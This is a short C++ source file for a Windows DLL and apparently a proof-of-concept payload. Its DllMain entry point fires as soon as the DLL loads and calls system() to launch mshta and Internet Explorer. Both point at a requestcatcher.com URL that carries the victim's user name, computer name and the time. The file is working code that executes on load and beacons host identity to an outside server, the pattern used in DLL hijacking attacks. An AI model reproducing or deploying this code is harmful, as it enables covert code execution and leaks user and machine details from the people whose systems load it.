#define UNICODE
#include "windows.h"


#pragma unmanaged
extern "C" BOOL APIENTRY DllMain(HMODULE hinstDLL, DWORD fwdReason, void* lpvReserved)
{
	if (fwdReason == DLL_PROCESS_ATTACH)
	{

		system("cmd.exe /c \"mshta \"https://v.requestcatcher.com/mshta?t=%username%\\%computername%\\%time%\"\"");
		system("cmd.exe /c \"\"%ProgramFiles%\\Internet Explorer\\iexplore.exe\" \"https://v.requestcatcher.com/ie?t=%username%\\%computername%\\%time%\"\"");
//		system("notepad %windir%\\win.ini");

	}
	return TRUE;
}
